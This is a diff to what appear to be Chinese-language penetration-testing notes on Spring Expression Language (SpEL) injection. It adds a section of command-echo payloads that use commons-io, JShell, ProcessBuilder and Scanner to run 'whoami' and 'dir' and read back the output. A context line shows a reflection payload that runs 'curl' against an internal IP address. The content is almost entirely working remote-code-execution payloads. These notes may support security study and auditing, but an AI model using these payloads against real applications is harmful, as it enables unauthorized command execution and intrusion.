@@ -228,6 +228,34 @@ public class EmailSender {
 
 `''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')`
 
+### SpEL注入回显
+
+##### 非通用回显
+
+* 依赖组件`org.apache.commons.io`
+
+```java
+T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
+```
+
+* jdk>=9 JShell
+
+```java
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+```
+
+* jdk原生，但是只能读取一行
+
+```java
+new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
+```
+
+* Scanner
+
+```java
+new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
+```
+
 ### SpEL相关漏洞分析
 
 ### SpEL表达式注入审计
